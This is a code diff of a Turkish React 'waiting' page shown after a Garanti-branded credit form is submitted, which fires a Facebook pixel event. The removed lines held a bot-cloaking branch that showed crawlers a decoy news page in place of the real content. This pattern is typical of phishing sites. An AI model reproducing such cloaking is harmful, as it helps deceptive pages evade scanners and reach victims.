@@ -1,9 +1,8 @@
 import React, { useEffect } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
-import { Helmet } from 'react-helmet';
-/* global fbq */
 
-function Bekleme({ isBot }) {
+/* global fbq */
+function Bekleme() {
   const location = useLocation();
   const navigate = useNavigate();
 
@@ -17,38 +16,13 @@ function Bekleme({ isBot }) {
       return;
     }
 
-    if (isCompleted && !isBot && typeof window !== 'undefined' && window.fbq) {
+    if (isCompleted && typeof window !== 'undefined' && window.fbq) {
       fbq('track', 'CompleteRegistration', {
         content_name: 'garanti_form_submission_completed',
         content_category: 'garanti_credit_form',
       }, { eventID: completeEventID });
     }
-  }, [location.state, navigate, isBot]);
-
-  if (isBot) {
-    return (
-      <>
-        <Helmet><meta name="robots" content="index, follow" /></Helmet>
-        <div>
-          <h1 style={{ color: '#333', textAlign: 'center' }}>Güncel Haberler</h1>
-          <p style={{ maxWidth: '600px', margin: '20px auto', textAlign: 'center' }}>
-            Son dakika haberleri, ekonomi, spor ve daha fazlası için haber portalımıza hoş geldiniz.
-          </p>
-          <div style={{ margin: '10px 0' }}>
-            <h2>Ekonomi Gündemi</h2>
-            <p>Borsa ve döviz kurlarında son gelişmeler...</p>
-          </div>
-          <div style={{ margin: '10px 0' }}>
-            <h2>Spor Dünyasından Haberler</h2>
-            <p>Futbol liglerinde heyecan devam ediyor...</p>
-          </div>
-          <p style={{ textAlign: 'center' }}>
-            <a href="/" style={{ color: '#0066cc', textDecoration: 'none' }}>Ana Sayfaya Dön</a>
-          </p>
-        </div>
-      </>
-    );
-  }
+  }, [location.state, navigate]);
 
   return (
     <div className="panel">
